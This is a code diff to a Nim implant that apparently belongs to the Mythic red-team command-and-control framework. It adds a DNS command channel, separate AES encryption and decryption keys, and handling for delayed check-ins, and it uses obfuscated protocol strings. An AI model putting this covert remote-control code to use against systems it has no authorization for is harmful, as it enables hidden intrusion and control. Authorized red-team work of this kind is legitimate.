@@ -4,6 +4,7 @@ import global_data
 import profiles/http_profile
 import profiles/websocket_profile
 import profiles/httpx_profile
+import profiles/dns_profile
 import utils/sysinfo
 import utils/mythic_responses
 import utils/debug
@@ -88,7 +89,7 @@ type
     mtClipboardMonitor, mtPortscan
   
   ProfileKind = enum
-    pkHttp, pkWebSocket, pkHttpx
+    pkHttp, pkWebSocket, pkHttpx, pkDns
   
   Profile = object
     case kind: ProfileKind
@@ -98,6 +99,8 @@ type
       wsProfile: WebSocketProfile
     of pkHttpx:
       httpxProfile: HttpxProfile
+    of pkDns:
+      dnsProfile: DnsProfile
   
   Agent* = ref object
     config: Config
@@ -119,6 +122,8 @@ proc send(profile: var Profile, data: string, callbackUuid: string = ""): string
     result = profile.wsProfile.send(data, callbackUuid)
   of pkHttpx:
     result = profile.httpxProfile.send(data, callbackUuid)
+  of pkDns:
+    result = profile.dnsProfile.send(data, callbackUuid)
 
 proc setAesKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
@@ -128,6 +133,19 @@ proc setAesKey(profile: var Profile, key: seq[byte]) =
     profile.wsProfile.setAesKey(key)
   of pkHttpx:
     profile.httpxProfile.setAesKey(key)
+  of pkDns:
+    profile.dnsProfile.setAesKey(key)
+
+proc setAesDecKey(profile: var Profile, key: seq[byte]) =
+  case profile.kind
+  of pkHttp:
+    profile.httpProfile.setAesDecKey(key)
+  of pkWebSocket:
+    profile.wsProfile.setAesDecKey(key)
+  of pkHttpx:
+    profile.httpxProfile.setAesDecKey(key)
+  of pkDns:
+    profile.dnsProfile.setAesDecKey(key)
 
 proc hasAesKey(profile: Profile): bool =
   case profile.kind
@@ -137,6 +155,8 @@ proc hasAesKey(profile: Profile): bool =
     result = profile.wsProfile.hasAesKey()
   of pkHttpx:
     result = profile.httpxProfile.hasAesKey()
+  of pkDns:
+    result = profile.dnsProfile.hasAesKey()
 
 proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: string] =
   case profile.kind
@@ -146,6 +166,8 @@ proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: str
     result = profile.wsProfile.performKeyExchange()
   of pkHttpx:
     result = profile.httpxProfile.performKeyExchange()
+  of pkDns:
+    result = profile.dnsProfile.performKeyExchange()
 
 proc newAgent*(): Agent =
   ## Create a new agent instance
@@ -163,6 +185,8 @@ proc newAgent*(): Agent =
     result.profile = Profile(kind: pkWebSocket, wsProfile: newWebSocketProfile())
   of "httpx":
     result.profile = Profile(kind: pkHttpx, httpxProfile: newHttpxProfile())
+  of "dns":
+    result.profile = Profile(kind: pkDns, dnsProfile: newDnsProfile())
   else:  # Default to HTTP for "http" or any other value
     result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
   
@@ -183,11 +207,15 @@ proc newAgent*(): Agent =
   if result.config.aesKey.len > 0:
     try:
       # AESPSK is a JSON string like: {"dec_key": "...", "enc_key": "...", "value": "aes256_hmac"}
+      # enc_key: used for agent → server encryption
+      # dec_key: used for server → agent decryption
       let aespskJson = parseJson(result.config.aesKey)
       let encKeyB64 = aespskJson["enc_key"].getStr()
-      let decoded = decode(encKeyB64)
-      let keyBytes = cast[seq[byte]](decoded)
-      result.profile.setAesKey(keyBytes)
+      let decKeyB64 = aespskJson["dec_key"].getStr()
+      let encKeyBytes = cast[seq[byte]](decode(encKeyB64))
+      let decKeyBytes = cast[seq[byte]](decode(decKeyB64))
+      result.profile.setAesKey(encKeyBytes)     # for encryption
+      result.profile.setAesDecKey(decKeyBytes)  # for decryption
       if result.config.encryptedExchange:
         debug "[DEBUG] AESPSK loaded for RSA staging (will be replaced by session key after key exchange)"
       else:
@@ -262,15 +290,21 @@ proc checkin*(agent: Agent): bool =
   
   return false
 
-proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode], rpfwd: seq[JsonNode]] =
+proc getTasks*(agent: var Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode], rpfwd: seq[JsonNode]] =
   ## Get tasking from Mythic
   ## Returns tasks, interactive messages, socks messages, and rpfwd messages
+  ## Also updates agent.callbackUuid if a delayed checkin response is received
   let getTaskingMsg = %*{
     obf("action"): obf("get_tasking"),
     obf("tasking_size"): -1
   }
   
+  debug "[DEBUG] Sending get_tasking with UUID: ", agent.callbackUuid
   let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
+  
+  debug "[DEBUG] get_tasking response length: ", response.len, " bytes"
+  if response.len > 0 and response.len < 200:
+    debug "[DEBUG] get_tasking response: ", response
   
   if response.len == 0:
     return (@[], @[], @[], @[])
@@ -282,6 +316,15 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
   
   try:
     let respJson = parseJson(response)
+    
+    # Check if this is a delayed checkin response (contains "id" field with callback UUID)
+    # This happens with DNS C2 when the server queues the checkin response
+    if respJson.hasKey(obf("id")) and respJson.hasKey(obf("status")):
+      if respJson[obf("status")].getStr() == obf("success"):
+        let newCallbackUuid = respJson[obf("id")].getStr()
+        if newCallbackUuid != agent.callbackUuid:
+          debug "[DEBUG] Received delayed checkin response - updating callback UUID from ", agent.callbackUuid, " to ", newCallbackUuid
+          agent.callbackUuid = newCallbackUuid
     
     if respJson.hasKey(obf("tasks")):
       tasks = respJson[obf("tasks")].getElems()
